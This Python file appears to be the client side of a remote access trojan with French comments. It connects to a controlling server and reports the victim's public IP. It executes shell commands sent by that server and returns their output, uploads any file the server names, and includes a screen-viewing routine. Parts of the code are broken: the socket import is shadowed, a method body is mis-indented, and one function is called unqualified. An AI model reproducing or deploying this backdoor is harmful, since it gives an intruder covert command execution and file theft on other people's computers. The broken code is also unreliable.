import socket
import os
import subprocess
from time import sleep
import json
from urllib import request

from socket import socket
from zlib import decompress
import pygame

IP = socket.gethostbyname("localhost")
PORT = 48
WIDTH = 1900
HEIGHT = 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))


class Client:
    def __init__(self, DATA):
        self.DATA = DATA

    def verifications(DATA):
        if (DATA == str.encode("command")):
            command = s.recv(1024)
            Client.command(command.decode("utf-8"))

        if (DATA == str.encode("home")):
            s.send(os.getcwd().encode())

        if (DATA == str.encode("exit")):
            s.close()
            exit()

        if (DATA == str.encode("filesend")):
            Client.send_archive(DATA)

    def get_ip():
        url = request.urlopen('http://ip-api.com/json').read()
        jsn = json.loads(url.decode('UTF-8'))
        ip = jsn['query']

        return (ip)

    def command(DATA):
        sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = sub.stderr.read() + sub.stdout.read()
        s.send(output)

    def send_archive(DATA):
        filename = s.recv(1024).decode("utf-8")

        with open(filename, "rb") as infile:
            # filesize = str(os.path.getsize(filename)).zfill(16)
            # s.send(filesize.encode())
            # sleep(1)

            chunk = infile.read(128 * 1024)
            s.send(chunk)

    def recvall(conn, length):
        # recuperer l'image
        buffer = b''
        while len(buffer) < length:
            data = conn.recv(length - len(buffer))
            if not data:
                return data
            buffer += data
        return buffer

    def image(IP, PORT):

    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    clock = pygame.time.Clock()
    watching = True

    s = socket()
    s.connect((IP, PORT))
    try:
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break

            # recuperer la taille et la longuer des pixel de l'image
            size_len = int.from_bytes(s.recv(1), byteorder='big')
            size = int.from_bytes(s.recv(size_len), byteorder='big')
            pixels = decompress(recvall(s, size))

            img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')
            screen.blit(img, (0, 0))
            pygame.display.flip()
            clock.tick(60)
    finally:
        s.close()


s.send(str.encode(f"je suis le client et\nj'ai l'adresse ip {Client.get_ip()}\n\n"))

while True:
    try:
        rcvc = s.recv(1024)
        Client.verifications(rcvc)

    except KeyboardInterrupt:
        s.close()
        exit()
